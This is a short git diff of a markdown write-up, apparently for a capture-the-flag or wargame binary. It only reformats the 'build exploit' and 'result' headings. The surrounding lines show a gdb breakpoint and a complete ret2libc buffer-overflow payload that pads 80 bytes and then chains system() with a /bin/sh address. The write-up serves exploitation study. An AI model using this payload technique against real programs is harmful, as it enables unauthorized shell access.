@@ -1,5 +1,3 @@
-
-
 ```
 (gdb) b verify_user_pass
 Breakpoint 1 at 0x80484a8
@@ -136,11 +134,11 @@ we find the /bin/sh addr 0xf7f897ec
 
 the row of password field is 100 chars
 
-build exploit:
+#### build exploit:
 
 USERNAME + '\n'(next fgets) + 'A' * 80 + RETURN_MAIN_FUNCTION + SYSTEM_FUNCTION_ADDR + 4_CHARs + ADDR_OF_/bin/sh
 
-result:
+#### result:
 
 'dat_wil' + '\n' + 'A' * 80 + '\xb5\x85\x04\x08' + '\xd0\xae\xe6\xf7' + 'DUMP' + '\xec\x97\xf8\xf7'
 
